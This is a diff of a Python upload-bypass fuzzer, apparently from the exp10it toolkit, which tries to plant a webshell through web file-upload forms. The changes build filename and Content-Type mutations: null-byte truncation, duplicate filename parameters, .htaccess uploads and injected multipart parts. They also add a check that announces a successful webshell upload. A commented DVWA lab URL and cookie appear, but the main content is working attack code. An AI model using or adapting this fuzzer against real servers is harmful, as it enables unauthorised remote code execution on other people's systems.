@@ -5,6 +5,7 @@ import urllib.error
 import urllib.parse
 import sys
 import argparse
+import chardet
 from exp10it import get_request
 from exp10it import get_param_part_from_content
 from exp10it import CONTENT_TYPE_LIST
@@ -81,35 +82,41 @@ def post_multipart_form_data(url, cookie, form_data_dict, boundary, form_file_pa
     with urllib.request.urlopen(req) as response:
         code = response.code
         html = response.read()
+        encoding = chardet.detect(html)['encoding']
+        html = html.decode(encoding=encoding)
     return_value['code'] = code
     return_value['html'] = html
     return return_value
 
 
-def get_work_file_info(url, cookie, form_data_dict, boundary, form_file_param_name, filename, content_type):
+def get_work_file_info(url, cookie, form_data_dict, boundary, form_file_param_name):
     file_suffix_list = ['jpg', 'png', 'gif', 'txt']
     for file_suffix in file_suffix_list:
         filename = "test.%s" % file_suffix
         if file_suffix == 'jpg':
             file_content = jpg_file_content
+            content_type = 'image/jpeg'
             rsp = post_multipart_form_data(
                 url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
             if rsp['code'] == 200:
                 return {'file_suffix': 'jpg', 'content_type': 'image/jpeg', 'file_content': jpg_file_content}
         elif file_suffix == 'png':
             file_content = png_file_content
+            content_type = 'image/png'
             rsp = post_multipart_form_data(
                 url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
             if rsp['code'] == 200:
                 return {'file_suffix': 'png', 'content_type': 'image/png', 'file_content': png_file_content}
         elif file_suffix == 'gif':
             file_content = gif_file_content
+            content_type = 'image/gif'
             rsp = post_multipart_form_data(
                 url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
             if rsp['code'] == 200:
                 return {'file_suffix': 'gif', 'content_type': 'image/gif', 'file_content': gif_file_content}
         elif file_suffix == 'txt':
             file_content = gif_file_content
+            content_type = 'text/plain'
             rsp = post_multipart_form_data(
                 url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
             if rsp['code'] == 200:
@@ -123,20 +130,23 @@ def check_upload_succeed(rsp, origin_html):
     html = rsp['html']
     if code != 200:
         return False
-    for line in html:
-        pdb.set_trace()
-        if not re.match(r"\s+", line) and line not in origin_html:
-            print(line)
+    lines = re.findall(r"([^\r\n]+)", html)
+    for line in lines:
+        if not re.match(r"^\s+$", line) and line not in origin_html:
+            result = re.search(r"([^\s<>]+\.%s)" % script_suffix, line, re.I)
+            if result:
+                result = result.group(1)
+                print(result)
+                pdb.set_trace()
+                print("Congratulations! Upload webshell succeed!")
+                sys.exit(1)
 
 
 def fuzz_upload_webshell():
     # url = 'http://192.168.135.39/dvwa/vulnerabilities/upload/'
     # cookie = 'security=low; PHPSESSID=cl4u4quib5tebhico07nopn2o0'
-    filename = "file.jpg.php"
-    filename = "filename=test.php\x00.jpg"
-    content_type = 'image/jpeg'
-    work_file_info = get_work_file_info(url, cookie, form_data_dict, boundary,
-                                        form_file_param_name, filename, content_type)
+    work_file_info = get_work_file_info(
+        url, cookie, form_data_dict, boundary, form_file_param_name)
     print(work_file_info)
     # 正常文件和webshell的后缀分别为work_suffix和script_suffix
     work_suffix = work_file_info['file_suffix']
@@ -151,10 +161,6 @@ def fuzz_upload_webshell():
     elif script_suffix == "jsp":
         webshell_content_type = "application/octet-stream"
 
-    rsp = post_multipart_form_data(
-        url, cookie, form_data_dict, boundary, form_file_param_name, work_file_content, filename, content_type)
-    check_upload_succeed(rsp, origin_html)
-    pdb.set_trace()
     fuzz_file_name = [
         {'desc': '修改后缀为webshell后缀',
             'modify': {'filename': 'test.%s' % script_suffix}},
@@ -180,52 +186,76 @@ def fuzz_upload_webshell():
 
     ]
     for i in range(0, 256):
-        item = {'desc': '%00截断组,%s截断' % hex(i), 'modify': {
+        item = {'desc': '%00截断组,' + hex(i) + '截断', 'modify': {
             'filename': 'test.%s%s.%s' % (script_suffix, chr(i), work_suffix)}}
         fuzz_file_name.append(item)
-        item = {'desc': '两个filename参数且前正常文件后webshell,且两个filename参数以%s分割' % hex(i), 'modify': {
+        item = {'desc': '两个filename参数且前正常文件后webshell,且两个filename参数以' + hex(i) + '分割', 'modify': {
             'filename': 'test.%s";%sfilename="test.%s' % (work_suffix, chr(i), script_suffix)}}
         fuzz_file_name.append(item)
-        item = {'desc': '两个filename参数且前webshell后正常文件,且两个filename参数以%s分割' % hex(i), 'modify': {
+        item = {'desc': '两个filename参数且前webshell后正常文件,且两个filename参数以' + hex(i) + '分割', 'modify': {
             'filename': 'test.%s";%sfilename="test.%s' % (script_suffix, chr(i), work_suffix)}}
         fuzz_file_name.append(item)
     if script_suffix == "php":
         item = {'desc': '上传.htaccess,只适用于php',
-                'modify': {'filename': '.htaccess'}},
+                'modify': {'filename': '.htaccess'}}
         fuzz_file_name.append(item)
 
     fuzz_content_type = [
         {'desc': '修改content-type为image/jpeg',
-            'modify': {'Content-Type': 'image/jpeg'}},
-        {'desc': '修改content-type为image/gif',
-            'modify': {'Content-Type': 'image/jpeg'}},
-        {'desc': '修改content-type为image/png',
-            'modify': {'Content-Type': 'image/jpeg'}},
-        {'desc': '修改content-type为text/plain',
-            'modify': {'Content-Type': 'image/jpeg'}},
+            'modify': {'content_type': 'image/jpeg'}},
+        {'desc': '修改content_type为image/gif',
+            'modify': {'content_type': 'image/jpeg'}},
+        {'desc': '修改content_type为image/png',
+            'modify': {'content_type': 'image/jpeg'}},
+        {'desc': '修改content_type为text/plain',
+            'modify': {'content_type': 'image/jpeg'}},
         # 双文件上传时,只修改content-type值的情况下可控的位置为两个文件的content-type,共4种情况
         {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type未修改,webshell的content-type未修改',
-            'modify': {'content-type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
+            'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
                 work_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, webshell_content_type)}},
         {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type修改为webshell的content-type,webshell的content-type未修改',
-            'modify': {'content-type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
+            'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
                 webshell_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, webshell_content_type)}},
         {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type未修改,webshell的content-type修改为正常文件的content-type',
-            'modify': {'content-type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
+            'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
                 work_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, work_content_type)}},
         {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type修改为webshell的content-type,webshell的content-type修改为正常文件的content-type',
-            'modify': {'content-type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
+            'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
                 webshell_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, work_content_type)}},
     ]
     for each in CONTENT_TYPE_LIST:
         item = {'desc': '修改content-type为%s' % each,
-                'modify': {'Conten-Type': each}}
+                'modify': {'content_type': each}}
         fuzz_content_type.append(item)
 
-    for filename in fuzz_file_name:
-        for content_type in fuzz_content_type:
-            filename = filename['modify']['filename']
-            content_type = content_type['modify']['content_type']
+    for filename_item in fuzz_file_name:
+        try:
+            print(filename_item['desc'])
+        except:
+            print(filename_item)
+            pdb.set_trace()
+        filename = filename_item['modify']['filename']
+        file_content = work_file_info['file_content']
+        content_type = work_file_info['content_type']
+        rsp = post_multipart_form_data(
+            url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
+        check_upload_succeed(rsp, origin_html)
+
+    for content_type_item in fuzz_content_type:
+        print(content_type_item['desc'])
+        filename = "test.%s" % script_suffix
+        content_type = content_type_item['modify']['content_type']
+        file_content = work_file_info['file_content']
+        rsp = post_multipart_form_data(
+            url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
+        check_upload_succeed(rsp, origin_html)
+
+    for filename_item in fuzz_file_name:
+        for content_type_item in fuzz_content_type:
+            print(filename_item['desc'])
+            print(content_type_item['desc'])
+            filename = filename_item['modify']['filename']
+            content_type = content_type_item['modify']['content_type']
             file_content = work_file_info['file_content']
             rsp = post_multipart_form_data(
                 url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
@@ -254,7 +284,6 @@ png_file_content = '''00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG...
 info = get_form_data_post_info(url, cookie)
 form_data_dict = info['form_data_dict']
 form_file_param_name = info['form_file_param_name']
-pdb.set_trace()
 origin_html = info['origin_html']
 boundary = '-------------------------7df3069603d6'
 
